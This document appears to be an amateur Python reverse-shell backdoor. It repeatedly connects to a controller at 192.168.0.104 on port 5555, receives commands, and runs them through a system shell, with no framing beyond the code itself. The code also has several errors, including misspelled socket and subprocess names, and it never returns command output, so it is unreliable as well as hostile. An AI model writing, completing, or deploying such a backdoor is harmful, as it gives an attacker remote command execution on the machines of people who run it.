import socket
import time
import json
import subprocess
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def reliable_send(data):
    jsondata=json.dumps(data)
    s.send(jsondata.encode())


def reliable_recieve():
    data=''
    while True:
        try: 
            data = data+ s.recieve(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while(True):
        time.sleep(20)
        try:
            s.connect(('192.168.0.104',5555))
            shell()
            s.close()
        except:
            connection()

def shell():
    while True:
        command=reliable_recieve()
        if command== 'quit':
            break
        else:
            execute = subprocess.Popen(command,shell =True, stdout=subprocess.PIPE, stderr=subprocess.pip,stdin=subprocess.pipe)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            

            

connection()